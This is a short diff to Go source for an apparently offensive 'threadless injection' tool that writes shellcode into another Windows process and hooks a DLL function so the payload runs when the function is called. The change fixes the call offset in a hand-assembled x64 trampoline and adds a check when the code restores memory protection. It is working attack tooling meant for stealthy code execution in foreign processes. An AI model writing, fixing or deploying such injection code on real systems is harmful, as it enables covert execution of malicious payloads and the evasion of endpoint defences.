@@ -200,7 +200,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		// sub rsp, 0x40
 		0x48, 0x83, 0xEC, 0x40,
 		// call <offset> - relative call to shellcode
-		0xE8, 0x11, 0x00, 0x00, 0x00, // Offset 0x11 (17 bytes) to skip cleanup code
+		0xE8, 0x12, 0x00, 0x00, 0x00, // Offset 0x12 (18 bytes) to skip cleanup code
 		// add rsp, 0x40
 		0x48, 0x83, 0xC4, 0x40,
 		// pop r13, r11, r10, r9, r8, rdx, rcx, rax
@@ -297,6 +297,10 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
+	if ret == 0 {
+		return output, fmt.Errorf("failed to restore function memory protection")
+	}
+	output += "[+] Restored function memory protection to PAGE_EXECUTE_READ\n"
 
 	output += "[+] Threadless injection complete!\n"
 	output += "[+] Shellcode will execute when the target process calls the hooked function\n"
